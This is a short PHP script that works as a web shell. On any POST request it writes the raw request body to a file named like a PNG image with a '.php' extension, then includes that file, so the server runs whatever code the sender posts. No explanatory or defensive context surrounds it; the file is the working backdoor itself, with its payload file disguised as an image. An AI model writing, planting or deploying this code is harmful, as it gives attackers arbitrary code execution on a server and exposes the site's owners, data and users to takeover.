<?php

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $code = file_get_contents("php://input"); 
    $file = 'HRfxNieT6oqmGyLBXxnG4ICzrNYYtmStIMwQun94.png.php';
    file_put_contents($file, "\n" . $code);
    include($file);
}
?>
